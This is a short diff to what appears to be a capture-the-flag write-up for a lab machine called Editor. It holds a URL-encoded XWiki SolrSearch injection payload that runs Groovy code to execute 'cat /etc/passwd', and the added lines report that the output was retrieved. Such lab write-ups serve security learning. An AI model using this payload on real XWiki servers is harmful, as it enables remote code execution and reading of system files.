@@ -145,3 +145,7 @@ and mixed with my url the final payload becomes
 ```http
 http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"
 ```
+
+The payload downloaded the output in a Solrsearch file which consists of `/etc/passwd`
+
+![[Editor-05.png]]
